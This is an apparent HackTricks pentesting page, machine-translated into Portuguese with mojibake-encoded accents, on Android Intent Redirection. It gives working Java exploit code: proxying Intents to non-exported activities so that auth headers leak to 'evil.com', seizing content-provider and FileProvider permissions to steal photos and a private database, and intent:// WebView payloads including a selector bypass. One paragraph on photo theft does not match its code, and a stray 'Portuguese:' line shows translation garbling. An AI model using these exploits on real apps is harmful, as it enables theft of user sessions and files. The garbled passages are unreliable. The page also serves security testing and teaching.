# Introdu√ß√£o

Essa vulnerabilidade se assemelha ao **Redirecionamento Aberto na seguran√ßa web**. Como a classe `Intent` √© `Parcelable`, **objetos pertencentes a essa classe** podem ser **passados** como **dados extras** em outro objeto `Intent`. \
Muitos desenvolvedores fazem **uso** dessa **caracter√≠stica** e criam **componentes proxy** (atividades, receptores de transmiss√£o e servi√ßos) que **recebem um Intent incorporado e o passam para m√©todos perigosos** como `startActivity(...)`, `sendBroadcast(...)`, etc. \
Isso √© perigoso porque **um atacante pode for√ßar o aplicativo a lan√ßar um componente n√£o exportado que n√£o pode ser lan√ßado diretamente de outro aplicativo**, ou conceder ao atacante acesso aos seus provedores de conte√∫do. **`WebView`** √†s vezes tamb√©m altera um **URL de uma string para um objeto `Intent`**, usando o m√©todo `Intent.parseUri(...)` e o passa para `startActivity(...)`.

{% hint style="info" %}
Resumindo: Se um atacante pode enviar um Intent que est√° sendo executado de forma insegura, ele pode potencialmente acessar componentes n√£o exportados e abus√°-los.
{% endhint %}

# Um caso t√≠pico

Vamos examinar um exemplo. Fragmento do arquivo `AndroidManifest.xml`
```markup
<activity android:name=".ProxyActivity" android:exported="true" />
<activity android:name=".AuthWebViewActivity" android:exported="false" />
```
Atividade `ProxyActivity`
```java
startActivity((Intent) getIntent().getParcelableExtra("extra_intent"));
```
Atividade `AuthWebViewActivity`
```java
webView.loadUrl(getIntent().getStringExtra("url"), getAuthHeaders());
```
`AuthWebViewActivity` √© um exemplo de **funcionalidade oculta do aplicativo que executa certas a√ß√µes inseguras**, neste caso, passando a sess√£o de autentica√ß√£o do usu√°rio para uma URL obtida do par√¢metro `url`.

Restri√ß√µes de exporta√ß√£o significam que **o atacante n√£o pode acessar `AuthWebViewActivity` diretamente**. Uma chamada direta...
```java
Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
intent.putExtra("url", "http://evil.com/");
startActivity(intent);
```
lan√ßa uma `java.lang.SecurityException`, devido √† `Negativa de Permiss√£o`: `AuthWebViewActivity` n√£o exportado do uid 1337.

Mas o atacante pode **for√ßar a v√≠tima a lan√ßar o `AuthWebViewActivity` por si s√≥**:
```java
Intent extra = new Intent();
extra.setClassName("com.victim", "com.victim.AuthWebViewActivity");
extra.putExtra("url", "http://evil.com/");

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
e nenhum viola√ß√£o de seguran√ßa surgir√°, porque o aplicativo que est√° sob ataque tem acesso a todos os seus pr√≥prios componentes. Usando este fragmento de c√≥digo, o atacante pode ignorar as restri√ß√µes incorporadas do sistema Android.

# Escalada de Impacto

Para aumentar o impacto dessa vulnerabilidade, voc√™ precisa encontrar outras vulnerabilidades/configura√ß√µes incorretas que possam permitir aumentar o impacto da vulnerabilidade (j√° que a vulnerabilidade por si s√≥ n√£o cria nenhum risco).

## Escalada de ataques via Provedores de Conte√∫do

Al√©m do acesso a componentes arbitr√°rios do aplicativo original, o atacante pode tentar obter acesso aos Provedores de Conte√∫do do aplicativo vulner√°vel que satisfa√ßam as seguintes condi√ß√µes:

* deve ser n√£o exportado (caso contr√°rio, poderia ser atacado diretamente, sem usar a vulnerabilidade que estamos discutindo neste artigo)
* deve ter a flag `android:grantUriPermissions` definida como `true`.
  * `android:grantUriPermissions="true"` indica que seu c√≥digo Java pode usar `FLAG_GRANT_READ_URI_PERMISSION` e `FLAG_GRANT_WRITE_URI_PERMISSION` para qualquer `Uri` servido por esse `ContentProvider`.
  * `android:grantUriPermissions="false"` indica que apenas os valores `Uri` especificados pelos elementos `<grant-uri-permission>` filho podem ser usados com `FLAG_GRANT_READ_URI_PERMISSION` e `FLAG_GRANT_WRITE_URI_PERMISSION`.

O atacante deve se definir como o destinat√°rio de um intent incorporado e definir as seguintes flags:

* `Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION` permite acesso persistente ao provedor (sem essa flag, o acesso √© apenas uma vez)
* `Intent.FLAG_GRANT_PREFIX_URI_PERMISSION` permite acesso URI por prefixo - por exemplo, em vez de obter acesso separado repetidamente usando um caminho completo como `content://com.victim.provider/image/1`, o atacante pode conceder acesso a todo o conte√∫do do provedor usando o URI `content://com.victim.provider/` e depois usar `ContentResolver` para endere√ßar `content://com.victim.provider/image/1`, `content://com.victim.provider/image/2`, etc.
* `Intent.FLAG_GRANT_READ_URI_PERMISSION` permite opera√ß√µes de leitura no provedor (como `query`, `openFile`, `openAssetFile`)
* `Intent.FLAG_GRANT_WRITE_URI_PERMISSION` permite opera√ß√µes de escrita

Um exemplo de um provedor t√≠pico onde um atacante pode obter acesso e realizar opera√ß√µes regulares como `query`, `update`, `insert`, `delete`, `openFile`, `openAssetFile`.
```markup
<provider android:name="com.victim.ContentProvider" android:exported="false" android:authorities="com.victim.provider" android:grantUriPermissions="true"/>
```
# Exemplo de roubo de fotos do usu√°rio no arquivo `AndroidManifest.xml`

Um atacante pode roubar fotos do usu√°rio de um aplicativo Android, explorando a falta de permiss√µes adequadas no arquivo `AndroidManifest.xml`. Para fazer isso, o atacante pode injetar um c√≥digo malicioso no aplicativo que permita o acesso √†s fotos do usu√°rio sem a devida permiss√£o.

Para evitar esse tipo de ataque, √© importante que os desenvolvedores de aplicativos Android garantam que todas as permiss√µes necess√°rias sejam solicitadas e concedidas corretamente no arquivo `AndroidManifest.xml`. Al√©m disso, √© importante que os usu√°rios estejam cientes das permiss√µes que est√£o concedendo ao instalar um aplicativo e que verifiquem se o aplicativo realmente precisa dessas permiss√µes para funcionar corretamente.
```markup
<activity android:name=".LeakActivity" android:exported="true" />
```
Arquivo `MainActivity.java`
```java
Intent extra = new Intent();
extra.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
        | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION
        | Intent.FLAG_GRANT_READ_URI_PERMISSION
        | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
extra.setClassName(getPackageName(), "com.attacker.LeakActivity");
extra.setData(Uri.parse("content://com.victim.provider/"));

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
`LeakActivity.java`
```java
Uri uri = Uri.parse(getIntent().getDataString() + "image/1")); // content://com.victim.provider/image/1
Bitmap bitmap = BitmapFactory.decodeStream(getContentResolver().openInputStream(uri)); // stolen image
```
## Ataques ao Android File Provider

Essa vulnerabilidade tamb√©m torna poss√≠vel para o atacante **roubar arquivos do aplicativo** localizados em diret√≥rios que o desenvolvedor predeterminou. Para um ataque bem-sucedido, o aplicativo malicioso precisa **obter direitos de acesso ao Android File Provider e, em seguida, ler o conte√∫do do provedor de arquivos usando o Android ContentResolver**.

Exemplo de provedor de arquivos (para mais detalhes, consulte [https://developer.android.com/reference/android/support/v4/content/FileProvider](https://developer.android.com/reference/android/support/v4/content/FileProvider))
```markup
<provider android:name="androidx.core.content.FileProvider" android:exported="false" android:authorities="com.victim.files_provider" android:grantUriPermissions="true">
    <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/provider_paths"/>
</provider>
```
Ele fornece acesso de leitura/escrita a arquivos em uma lista especial que pode ser encontrada nos recursos do aplicativo, neste caso em `res/xml/provider_paths.xml`.

Pode parecer algo como:
```markup
<?xml version="1.0" encoding="utf-8"?>
<paths>
    <root-path name="root" path=""/>
    <files-path name="internal_files" path="."/>
    <cache-path name="cache" path=""/>
    <external-path name="external_files" path="images"/>
</paths>
```
Cada tag especifica um diret√≥rio raiz com um valor `path` relativo ao diret√≥rio raiz. Por exemplo, o valor `external_files` corresponder√° a `new File(Environment.getExternalStorageDirectory(), "images")`.

O valor `root-path` corresponde a `/`, ou seja, fornece acesso a arquivos arbitr√°rios.

Digamos que tenhamos alguns dados secretos armazenados no arquivo `/data/data/com.victim/databases/secret.db`: o roubo desse arquivo pode parecer algo assim `MainActivity.java`.
```java
Intent extra = new Intent();
extra.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
extra.setClassName(getPackageName(), "com.attacker.LeakActivity");
extra.setData(Uri.parse("content://com.victim.files_provider/root/data/data/com.victim/databases/secret.db"));

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
`LeakActivity.java`
```java
InputStream i = getContentResolver().openInputStream(getIntent().getData()); // we can now do whatever we like with this stream, e.g. send it to a remote server
```
## Acesso a componentes arbitr√°rios via WebView

Um objeto Intent pode ser convertido em uma string com uma chamada para `Intent.toUri(flags)` e de volta de uma string para um Intent usando `Intent.parseUri(stringUri, flags)`. Essa funcionalidade √© frequentemente usada no WebView (o navegador integrado do aplicativo): o **aplicativo pode verificar um esquema `intent://`, analisar a URL em um Intent e iniciar a atividade**.

**Essa vulnerabilidade pode ser explorada tanto por outras vulnerabilidades** (por exemplo, a capacidade de abrir links arbitr√°rios no aplicativo no WebView diretamente por meio de atividades exportadas ou por meio do mecanismo deeplink) no aplicativo do cliente quanto remotamente, incluindo cross-site scripting no lado do servidor ou MitM no lado do cliente.

Exemplo de c√≥digo vulner√°vel
```java
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
    Uri uri = request.getUrl();
    if("intent".equals(uri.getScheme())) {
        startActivity(Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME));
        return true;
    }
    return super.shouldOverrideUrlLoading(view, request);
}
```
O ponto aqui √© que o m√©todo `shouldOverrideUrlLoading(...)` da classe `WebViewClient` √© chamado toda vez que o WebView tenta carregar um novo link, mas d√° √† aplica√ß√£o a op√ß√£o de adicionar um manipulador personalizado.

Para explorar essa vulnerabilidade, o atacante precisa criar um redirecionamento WebView para um URL de esquema de inten√ß√£o especialmente preparado. Exemplo de cria√ß√£o de URL:
```java
Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
intent.putExtra("url", "http://evil.com/");
Log.d("evil", intent.toUri(Intent.URI_INTENT_SCHEME)); // outputs "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end"
```
Exemplo de ataque
```java
location.href = "intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end";
```
Esta vers√£o cont√©m **v√°rias restri√ß√µes em compara√ß√£o com a vers√£o cl√°ssica** da vulnerabilidade:

* Objetos `Parcelable` e `Serializable` incorporados n√£o podem ser convertidos em string (eles ser√£o ignorados)
* As flags inseguras `Intent.FLAG_GRANT_READ_URI_PERMISSION` e `Intent.FLAG_GRANT_WRITE_URI_PERMISSION` s√£o **ignoradas** quando `Intent.parseUri(...)` √© chamado. O analisador s√≥ as deixar√° se a flag `Intent.URI_ALLOW_UNSAFE` (`startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME | Intent.URI_ALLOW_UNSAFE))` for definida, o que √© muito raro.

Muitos desenvolvedores ainda esquecem de realizar uma filtragem completa de intents recebidos via WebView.
```java
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
    Uri uri = request.getUrl();
    if("intent".equals(uri.getScheme())) {
    	Intent intent = Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME);
    	intent.addCategory("android.intent.category.BROWSABLE");
    	intent.setComponent(null);
      startActivity(intent);
      return true;
    }
    return super.shouldOverrideUrlLoading(view, request);
}
```
O atacante pode especificar um componente n√£o exportado atrav√©s de um seletor.
```java
Intent intent = new Intent();
intent.setSelector(new Intent().setClassName("com.victim", "com.victim.AuthWebViewActivity"));
intent.putExtra("url", "http://evil.com/");
Log.d("evil", intent.toUri(Intent.URI_INTENT_SCHEME)); // "intent:#Intent;S.url=http%3A%2F%2Fevil.com%2F;SEL;component=com.victim/.AuthWebViewActivity;end"
```
E contornar a prote√ß√£o do aplicativo contra intents expl√≠citos. Portanto, recomendamos filtrar tamb√©m o seletor.
```java
intent.addCategory("android.intent.category.BROWSABLE");
intent.setComponent(null);
intent.setSelector(null);
```
Mas mesmo a filtragem completa n√£o garante prote√ß√£o completa, porque um atacante pode criar um intent impl√≠cito correspondente ao `intent-filter` de alguma atividade n√£o exportada. Exemplo de declara√ß√£o de atividade:
```markup
<activity android:name=".AuthWebViewActivity" android:exported="false">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <data android:scheme="victim" android:host="secure_handler" />
    </intent-filter>
</activity>
```

```java
webView.loadUrl(getIntent().getData().getQueryParameter("url"), getAuthHeaders());
```
Portuguese:

Portanto, recomendamos verificar se uma atividade √© exportada antes de ser iniciada.

## Outras maneiras de criar intents inseguras

Alguns desenvolvedores de aplicativos implementam seus pr√≥prios analisadores de intents (geralmente para lidar com deeplinks ou mensagens push), usando, por exemplo, objetos JSON, strings ou matrizes de bytes, que n√£o diferem do padr√£o ou apresentam um grande perigo, porque podem expandir objetos `Serializable` e `Parcelable` e tamb√©m permitem que flags inseguras sejam definidas. O pesquisador de seguran√ßa tamb√©m pode encontrar vers√µes mais ex√≥ticas de cria√ß√£o de intents, como a convers√£o de uma matriz de bytes em um `Parcel` e, em seguida, a leitura de um intent a partir dele.
```java
Uri deeplinkUri = getIntent().getData();
if(deeplinkUri.toString().startsWith("deeplink://handle/")) {
    byte[] handle = Base64.decode(deeplinkUri.getQueryParameter("param"), 0);
    Parcel parcel = Parcel.obtain();
    parcel.unmarshall(handle, 0, handle.length);
    startActivity((Intent) parcel.readParcelable(getClassLoader()));
}
```
# Vuln app

{% embed url="https://github.com/oversecured/ovaa" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas t√©cnicas de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
